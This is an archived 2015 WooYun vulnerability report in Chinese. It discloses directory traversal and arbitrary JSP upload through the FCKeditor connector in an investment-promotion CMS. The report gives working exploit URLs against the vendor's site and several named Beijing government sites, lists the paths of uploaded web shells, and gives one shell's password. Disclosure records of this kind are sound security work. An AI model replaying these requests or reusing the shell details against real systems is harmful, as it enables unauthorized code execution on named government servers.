{"id": 34152, "wybug_id": "wooyun-2015-0107100", "wybug_title": "某投资促进系统通用型漏洞打包", "wybug_corp": "北京大思潮投资顾问有限公司", "wybug_author": "路人甲", "wybug_date": "2015-04-16 17:22", "wybug_open_date": "2015-07-20 12:14", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向公众公开  简要描述： 1#目录遍历2#任意文件上传 详细说明：  大思潮是投资促进新思维与解决方案的专业提供机构，十多年来一直为国内各省、市、区县及开发区提供吸引外来投资的决策研究及与投资促进相关的咨询、策划、政策、信息、活动、培训、设计和网络技术等专业服务，并为中外投资者在国内投资，尤其是在京投资提供全方位系列服务。大思潮立足中国投资促进实践，创新思维，以“利他”为行为指导，以“诚实做人，认真做事”为行为规范，着力于推进投资促进事业。十五年中，大思潮用真诚的心，做专业的事，已完成了数百个投资促进领域政府、开发区和投资者的委托项目。官网：http://www.fdip.cn以官网为案例进行演示：系统存在问题的地方在编辑器编辑器路径http://www.fdip.cn/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../1、目录遍历\n\n\n\n2、任意文件上传\n\n这里是browser.htmhttp://www.fdip.cn/cms/FCKeditor/editor/filemanager/browser/default/browser.htm?Type=Image&Connector=http://www.fdip.cn/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector可直接上传jsp\n\n\n\n一句话地址：http://www.fdip.cn//UserFiles/Image/01.jsp(已删除)\n\n另外提供几个案例供复现http://swj.bjchy.gov.cn/北京市朝阳区商务局\nhttp://swj.bjchy.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://swj.bjchy.gov.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://swj.bjchy.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\n\n\nhttp://swj.bjchy.gov.cn/upload/Image/wooyun(1).jsp\n\nhttp://www.investpinggu.gov.cn/北京市平谷区投资促进网\nhttp://www.investpinggu.gov.cn//cms//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://www.investpinggu.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/browser.htm?Type=Image&Connector=http://www.investpinggu.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\n\n\nhttp://www.investpinggu.gov.cn/UserFiles/Image/wooyun.jsp\n\nhttp://221.174.24.131/cysw/ \nhttp://221.174.24.131/cysw/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://221.174.24.131/cysw/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://221.174.24.131/cysw/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\n\nhttp://221.174.24.131/pinggu/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://221.174.24.131/pinggu/cms/FCKeditor/editor/filemanager/browser/default/browser.htm?Type=Image&Connector=http://221.174.24.131/pinggu/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\n北京市东城区产业和投资促进局\nhttp://ccj.bjdch.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://ccj.bjdch.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/browser.htm?Type=Image&Connector=http://ccj.bjdch.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\n\n\nhttp://ccj.bjdch.gov.cn/UserFiles/Image/wooyun.jsp\n\n北京市东城区中小企业和非公经济网\nhttp://smedch.bjdch.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://smedch.bjdch.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/browser.htm?Type=Image&Connector=http://smedch.bjdch.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\n\n\nhttp://smedch.bjdch.gov.cn/UserFiles/Image/wooyun.jsp\n\n   漏洞证明：  再演示一个北京市投资促进局http://www.investbeijing.gov.cn/http://www.investbeijing.gov.cn//cms//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\n\n\nhttp://www.investbeijing.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/browser.htm?Type=Image&Connector=http://www.investbeijing.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\n\n这里上传后没有发现文件，通过遍历，发现默认的上传路径被修改到了根目录下upload文件夹shell地址：http://www.investbeijing.gov.cn/upload/Image/01.jsp密码：sq0zr\n\n\n\n   修复方案：  控制权限   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-04-21 12:13 厂商回复： 属默认部署的漏洞，CNVD确认并复现所述情况,涉及案例已经转由CNCERT向国家上级信息安全协调机构上报,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}